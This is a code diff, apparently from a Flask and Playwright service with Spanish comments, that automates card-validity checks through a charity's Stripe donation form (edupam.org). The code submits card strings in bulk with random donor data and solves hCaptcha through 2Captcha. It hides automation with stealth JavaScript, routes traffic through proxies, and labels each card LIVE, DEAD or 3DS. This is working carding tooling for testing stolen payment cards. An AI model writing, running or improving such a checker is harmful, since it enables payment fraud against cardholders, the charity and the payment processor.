@@ -33,11 +33,59 @@ EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
 EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
 DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
 MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))
+
+# NUEVA VARIABLE: PROXY_STRING (formato: usuario:contraseña@host:puerto)
+PROXY_STRING = os.environ.get('PROXY_STRING', '')
+
+# Variables de proxy individuales (solo para compatibilidad si no se usa PROXY_STRING)
 PROXY_SERVER = os.environ.get('PROXY_SERVER', '')
 PROXY_USERNAME = os.environ.get('PROXY_USERNAME', '')
 PROXY_PASSWORD = os.environ.get('PROXY_PASSWORD', '')
 
-# Variables globales de estado
+# ==================== PARSEO DE PROXY_STRING ====================
+def parse_proxy_string(proxy_string):
+    """
+    Parsea una cadena con formato: usuario:contraseña@host:puerto
+    Retorna un dict con 'server', 'username', 'password' o None si falla.
+    """
+    if not proxy_string:
+        return None
+
+    # Dividir en usuario:contraseña y host:puerto
+    try:
+        auth, host = proxy_string.split('@', 1)
+        username, password = auth.split(':', 1)
+        # Asegurar que host tenga protocolo (si no, añadir http://)
+        if not host.startswith(('http://', 'https://')):
+            host = 'http://' + host
+        return {
+            'server': host,
+            'username': username,
+            'password': password
+        }
+    except Exception as e:
+        logger.error(f"Error parseando PROXY_STRING: {e}")
+        return None
+
+# Determinar configuración de proxy final
+proxy_config = None
+if PROXY_STRING:
+    proxy_config = parse_proxy_string(PROXY_STRING)
+    if proxy_config:
+        logger.info(f"Proxy configurado mediante PROXY_STRING: {proxy_config['server']}")
+    else:
+        logger.warning("PROXY_STRING inválida, se intentará usar variables individuales")
+
+if not proxy_config and PROXY_SERVER:
+    # Fallback a variables individuales
+    proxy_config = {
+        'server': PROXY_SERVER,
+        'username': PROXY_USERNAME,
+        'password': PROXY_PASSWORD
+    }
+    logger.info(f"Proxy configurado mediante variables individuales: {PROXY_SERVER}")
+
+# ==================== VARIABLES GLOBALES ====================
 checking_status = {
     'active': False,
     'processed': 0,
@@ -80,16 +128,14 @@ STEALTH_JS = """
     Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
 """
 
-# ==================== CAPTCHA SOLVER (async wrapper) ====================
+# ==================== CAPTCHA SOLVER ====================
 async def solve_captcha_api_async(page_url, sitekey):
-    """Resuelve hCaptcha usando 2Captcha (bloqueante, ejecutado en thread)"""
     if not API_KEY_2CAPTCHA:
         logger.warning("No API key for 2Captcha")
         return None
     
     def _solve():
         try:
-            # Crear tarea
             data = {
                 "clientKey": API_KEY_2CAPTCHA,
                 "task": {
@@ -130,10 +176,8 @@ async def solve_captcha_api_async(page_url, sitekey):
     return await loop.run_in_executor(None, _solve)
 
 async def solve_captcha_if_present(page):
-    """Detecta hCaptcha y lo resuelve usando 2Captcha"""
     try:
         sitekey = None
-        # Buscar en frames
         for frame in page.frames:
             url = frame.url.lower()
             if "hcaptcha.com" in url and "js.stripe.com" not in url:
@@ -143,7 +187,6 @@ async def solve_captcha_if_present(page):
                     logger.info(f"🧩 hCaptcha detectado (frame): {sitekey[:10]}...")
                     break
         if not sitekey:
-            # Buscar en DOM
             elem = await page.query_selector('[data-sitekey]')
             if elem:
                 sitekey = await elem.get_attribute('data-sitekey')
@@ -152,7 +195,6 @@ async def solve_captcha_if_present(page):
         if sitekey:
             token = await solve_captcha_api_async(page.url, sitekey)
             if token and len(token) > 20:
-                # Inyectar token
                 await page.evaluate(f"""
                     (token) => {{
                         let h = document.getElementsByName('h-captcha-response');
@@ -171,12 +213,12 @@ async def solve_captcha_if_present(page):
             else:
                 logger.warning("❌ Fallo al resolver captcha")
                 return False
-        return True  # No captcha
+        return True
     except Exception as e:
         logger.error(f"Error en solve_captcha: {e}")
         return False
 
-# ==================== CLASE EDU SESSION (ASYNCIO) ====================
+# ==================== CLASE EDU SESSION ====================
 class EduSession:
     def __init__(self):
         self.playwright = None
@@ -185,11 +227,13 @@ class EduSession:
         self.page = None
         self.is_open = False
         self.proxy = None
-        if PROXY_SERVER:
-            self.proxy = {"server": PROXY_SERVER}
-            if PROXY_USERNAME and PROXY_PASSWORD:
-                self.proxy["username"] = PROXY_USERNAME
-                self.proxy["password"] = PROXY_PASSWORD
+        # Usar la configuración de proxy global
+        if proxy_config:
+            self.proxy = {
+                "server": proxy_config['server'],
+                "username": proxy_config['username'],
+                "password": proxy_config['password']
+            }
 
     async def start_browser(self):
         await self.close()
@@ -241,7 +285,6 @@ class EduSession:
         self.is_open = False
 
     async def process_card(self, card_string, amount=None):
-        """Procesa una tarjeta, devuelve resultado con status LIVE/DEAD/3DS/ERROR"""
         if not self.is_open or not self.page:
             if not await self.start_browser():
                 return {"status": "ERROR", "message": "Browser init failed", "card": "****"}
@@ -249,7 +292,6 @@ class EduSession:
         page = self.page
         stripe_data = {"status": None, "body": None}
         
-        # Listener de respuestas Stripe
         async def handle_response(response):
             if "api.stripe.com" in response.url and "confirm" in response.url:
                 try:
@@ -260,10 +302,8 @@ class EduSession:
                 except:
                     pass
         
-        # Registrar listener
         page.on("response", handle_response)
         
-        # Parsear tarjeta
         parts = card_string.strip().split('|')
         if len(parts) < 4:
             return {"status": "ERROR", "message": "Formato inválido", "card": card_string[:4]+"****"}
@@ -273,7 +313,6 @@ class EduSession:
         card_last4 = cc_num[-4:]
         
         try:
-            # Si la URL no es la correcta, navegar
             current_url = page.url.rstrip('/')
             target_url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}".rstrip('/')
             if current_url != target_url:
@@ -281,10 +320,8 @@ class EduSession:
             else:
                 await page.reload()
             
-            # Esperar formulario
             await page.wait_for_selector('input[name="name"]', timeout=60000)
             
-            # Datos aleatorios o fijos
             if EDUPAM_DONOR_NAME and EDUPAM_DONOR_LASTNAME:
                 name = EDUPAM_DONOR_NAME
                 lastname = EDUPAM_DONOR_LASTNAME
@@ -298,8 +335,6 @@ class EduSession:
             
             birthdate = get_random_birthdate()
             donation_amount = amount if amount else DONATION_AMOUNT
-            # Si se permite rango aleatorio, descomentar:
-            # donation_amount = random.randint(10, 50)
             
             await page.fill('input[name="name"]', name)
             await page.fill('input[name="lastname"]', lastname)
@@ -307,13 +342,11 @@ class EduSession:
             await page.fill('input[name="birthdate"]', birthdate)
             await page.fill('input[name="quantity"]', str(donation_amount))
             
-            # Seleccionar tipo de donación (si existe)
             if await page.is_visible('#dr-type'):
                 await page.click('#dr-type')
             elif await page.is_visible('input#r-type'):
                 await page.check('input#r-type', force=True)
             
-            # Stripe iframe
             stripe_frame = page.frame_locator("iframe[name^='__privateStripeFrame']").first
             if not stripe_frame:
                 stripe_frame = page.frame_locator("#card-element iframe")
@@ -324,7 +357,6 @@ class EduSession:
             if await stripe_frame.locator('input[name="postal"]').count() > 0:
                 await stripe_frame.locator('input[name="postal"]').fill("11000")
             
-            # Click en botón de donación
             try:
                 await page.click('#btn-donation')
             except:
@@ -332,24 +364,20 @@ class EduSession:
             
             await asyncio.sleep(3)
             
-            # Resolver captcha si aparece (solo si tenemos API key)
             if API_KEY_2CAPTCHA:
                 await solve_captcha_if_present(page)
             
-            # Polling de resultado (hasta 180 segundos)
             end_time = time.time() + 180
             final_status = "UNKNOWN"
             final_message = "Timeout"
             
             while time.time() < end_time:
                 try:
-                    # 1. URL de éxito
                     if "success" in page.url or "gracias" in page.url:
                         final_status = "LIVE"
                         final_message = "Redirección a página de éxito"
                         break
                     
-                    # 2. Respuesta de Stripe API
                     if stripe_data["body"]:
                         body = stripe_data["body"]
                         if isinstance(body, dict):
@@ -371,7 +399,6 @@ class EduSession:
                                 final_message = "Pago exitoso (Stripe)"
                                 break
                     
-                    # 3. Mensaje visible en página (validación rápida)
                     try:
                         msg_elem = page.locator('#message')
                         if await msg_elem.count() > 0 and await msg_elem.is_visible():
@@ -388,7 +415,6 @@ class EduSession:
                     except:
                         pass
                     
-                    # 4. Detectar 3D Secure en frames
                     three_ds_keywords = ["acs", "3dsecure", "cardinal", "centinel", "challenge", "verification"]
                     for frame in page.frames:
                         frame_url = frame.url.lower()
@@ -399,7 +425,6 @@ class EduSession:
                     if final_status != "UNKNOWN":
                         break
                     
-                    # 5. Texto en el body (declinación genérica)
                     content = await page.content()
                     content_lower = content.lower()
                     if "card was declined" in content_lower or "tarjeta rechazada" in content_lower:
@@ -414,7 +439,6 @@ class EduSession:
                 
                 await asyncio.sleep(1)
             
-            # Mapear estados finales
             status_map = {
                 "LIVE": "LIVE",
                 "DEAD": "DEAD",
@@ -448,13 +472,12 @@ class EduSession:
                 "card": f"****{card_last4}"
             }
         finally:
-            # Remover listener
             try:
                 page.remove_listener("response", handle_response)
             except:
                 pass
 
-# ==================== WORKER ASYNC ====================
+# ==================== WORKER ====================
 async def process_cards_async(cards, amount, stop_on_live):
     global checking_status
     session = EduSession()
@@ -530,7 +553,7 @@ def run_async_worker(cards, amount, stop_on_live):
     finally:
         loop.close()
 
-# ==================== ENDPOINTS FLASK ====================
+# ==================== ENDPOINTS ====================
 @app.route('/')
 def index():
     return jsonify({
@@ -549,7 +572,7 @@ def index():
             "headless": HEADLESS,
             "donation_amount": DONATION_AMOUNT,
             "max_workers": MAX_WORKERS,
-            "proxy": "enabled" if PROXY_SERVER else "disabled",
+            "proxy": "enabled" if proxy_config else "disabled",
             "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
         }
     })
@@ -563,7 +586,7 @@ def health_check():
         'timestamp': dt.now().isoformat(),
         'features': {
             '2captcha': bool(API_KEY_2CAPTCHA),
-            'proxy': bool(PROXY_SERVER),
+            'proxy': bool(proxy_config),
             'async_playwright': True
         }
     })
@@ -591,7 +614,6 @@ def check_single_card():
     if not card_data or '|' not in card_data:
         return jsonify({'error': 'Formato inválido'}), 400
     
-    # Ejecutar en un loop asyncio temporal
     async def _check():
         session = EduSession()
         try:
@@ -674,6 +696,6 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     debug = os.environ.get('FLASK_ENV', 'production') == 'development'
     logger.info(f"🚀 Servidor iniciado en puerto {port}")
-    logger.info(f"🔧 Headless: {HEADLESS}, Proxy: {'Sí' if PROXY_SERVER else 'No'}")
+    logger.info(f"🔧 Headless: {HEADLESS}, Proxy: {'Sí' if proxy_config else 'No'}")
     logger.info(f"🧩 2Captcha: {'Habilitado' if API_KEY_2CAPTCHA else 'Deshabilitado'}")
     app.run(host='0.0.0.0', port=port, debug=debug)
